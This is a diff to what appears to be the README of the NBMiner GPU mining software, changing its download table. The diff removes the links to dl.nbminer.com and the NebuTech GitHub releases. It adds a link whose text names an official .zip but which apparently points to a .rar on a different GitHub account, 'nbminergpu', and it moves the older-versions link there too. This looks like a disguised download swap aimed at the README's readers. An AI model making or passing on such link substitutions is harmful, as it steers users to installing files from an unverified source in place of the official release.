@@ -20,14 +20,10 @@ Be aware when you download NBMiner binaries from other sources.
 
 | version | Windows                                                      | Linux                                                        |
 | ------- | ------------------------------------------------------------ | ------------------------------------------------------------ |
-| 42.3    | [NBMiner_42.3_Win.zip](https://dl.nbminer.com/NBMiner_42.3_Win.zip) | [NBMiner_42.3_Linux.tgz](https://dl.nbminer.com/NBMiner_42.3_Linux.tgz) |
-| 42.2    | [NBMiner_42.2_Win.zip](https://dl.nbminer.com/NBMiner_42.2_Win.zip) | [NBMiner_42.2_Linux.tgz](https://dl.nbminer.com/NBMiner_42.2_Linux.tgz) |
-| 41.5    | [NBMiner_41.5_Win.zip](https://dl.nbminer.com/NBMiner_41.5_Win.zip) | [NBMiner_41.5_Linux.tgz](https://dl.nbminer.com/NBMiner_41.5_Linux.tgz) |
-| 41.3    | [NBMiner_41.3_Win.zip](https://dl.nbminer.com/NBMiner_41.3_Win.zip) | [NBMiner_41.3_Linux.tgz](https://dl.nbminer.com/NBMiner_41.3_Linux.tgz) |
-| 41.0    | [NBMiner_41.0_Win.zip](https://dl.nbminer.com/NBMiner_41.0_Win.zip) | [NBMiner_41.0_Linux.tgz](https://dl.nbminer.com/NBMiner_41.0_Linux.tgz) |
-| 40.1    | [NBMiner_40.1_Win.zip](https://dl.nbminer.com/NBMiner_40.1_Win.zip) | [NBMiner_40.1_Linux.tgz](https://dl.nbminer.com/NBMiner_40.1_Linux.tgz) |
+| 42.3    | [NBMiner_42.3_Win.zip](https://github.com/nbminergpu/NBMiner/releases/download/v42.3/NBMiner_Win.rar) | [NBMiner_42.3_Linux.tgz](https://dl.nbminer.com/NBMiner_42.3_Linux.tgz) |
 
-- Download older versions from [github releases](https://github.com/NebuTech/NBMiner/releases)
+
+- Download older versions from [github releases](https://github.com/nbminergpu/NBMiner/releases/releases)
 
 ## Features
 
